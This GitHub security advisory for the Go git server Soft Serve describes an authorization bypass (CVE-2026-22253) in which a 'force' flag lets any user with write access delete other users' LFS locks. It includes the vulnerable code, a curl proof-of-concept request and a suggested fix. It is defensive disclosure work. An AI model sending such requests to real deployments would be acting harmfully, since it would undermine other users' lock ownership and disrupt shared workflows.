# [M] Soft Serve is missing an authorization check in LFS lock deletion

## Summary
Severity: Medium
Advisory: GHSA-6jm8-x3g6-r33j
CVE: CVE-2026-22253
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-01-08
Source: https://github.com/advisories/GHSA-6jm8-x3g6-r33j
Type: github-advisory

## Affected
- Go: `github.com/charmbracelet/soft-serve` — affected >=0 <0.11.2

## Details
## LFS Lock Force-Delete Authorization Bypass

### Summary

An authorization bypass in the LFS lock deletion endpoint allows any authenticated user with repository write access to delete locks owned by other users by setting the `force` flag. The vulnerable code path processes force deletions before retrieving user context, bypassing ownership validation entirely.

### Severity

- **CWE-863:** Incorrect Authorization
- **CVSS 3.1:** 5.4 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L`

### Affected Code

**File:** `pkg/web/git_lfs.go`
**Function:** `serviceLfsLocksDelete` (lines 831–945)
**Endpoint:** `POST /<repo>.git/info/lfs/locks/:lockID/unlock`

The control flow processes `req.Force` at line 905 before retrieving user context at line 919:

```go
// Line 905-916: Force delete executes immediately without authorization
if req.Force {
    if err := datastore.DeleteLFSLock(ctx, dbx, repo.ID(), lockID); err != nil {
        // ...
    }
    renderJSON(w, http.StatusOK, l)
    return  // Returns here, never reaching user validation
}

// Line 919: User context retrieved after force path has exited
user := proto.UserFromContext(ctx)
```

### Proof of Concept

**Setup:** Two users with write access to the same repository—User A (lock owner) and User B (attacker).

1. **User A creates a lock:**
   ```bash
   curl -X POST http://localhost:23232/repo.git/info/lfs/locks \
     -H "Authorization: Basic <user_a_token>" \
     -H "Content-Type: application/vnd.git-lfs+json" \
     -d '{"path": "protected-file.bin"}'
   ```

2. **User B deletes User A's lock using force flag:**
   ```bash
   curl -X POST http://localhost:23232/repo.git/info/lfs/locks/1/unlock \
     -H "Authorization: Basic <user_b_token>" \
     -H "Content-Type: application/vnd.git-lfs+json" \
     -d '{"force": true}'
   ```

3. **Result:** Lock deleted successfully with `200 OK`. Expected: `403 Forbidden`.

### Suggested Fix

Retrieve user context and validate authorization before processing the force flag:

```go
user := proto.UserFromContext(ctx)
if user == nil {
    renderJSON(w, http.StatusUnauthorized, lfs.ErrorResponse{
        Message: "unauthorized",
    })
    return
}

if req.Force {
    if !user.IsAdmin() {
        renderJSON(w, http.StatusForbidden, lfs.ErrorResponse{
            Message: "admin access required for force delete",
        })
        return
    }
    if err := datastore.DeleteLFSLock(ctx, dbx, repo.ID(), lockID); err != nil {
        // ...
    }
    renderJSON(w, http.StatusOK, l)
    return
}
```

### Impact

**Affected Deployments:** Soft Serve instances with LFS enabled and repositories with multiple collaborators.

**Exploitation Requirements:**
- Authenticated session
- Write access to target repository

**Consequences:**
- Unauthorized deletion of other users' locks
- Bypass of LFS file coordination mechanisms
- Potential workflow disruption in collaborative environments

**Limitations:** Does not grant file access, escalate repository permissions, or affect repositories where the attacker lacks write access.

## References
- https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-6jm8-x3g6-r33j
- https://nvd.nist.gov/vuln/detail/CVE-2026-22253
- https://github.com/charmbracelet/soft-serve/commit/000ab5164f0be68cf1ea6b6e7227f11c0e388a42
- https://github.com/charmbracelet/soft-serve
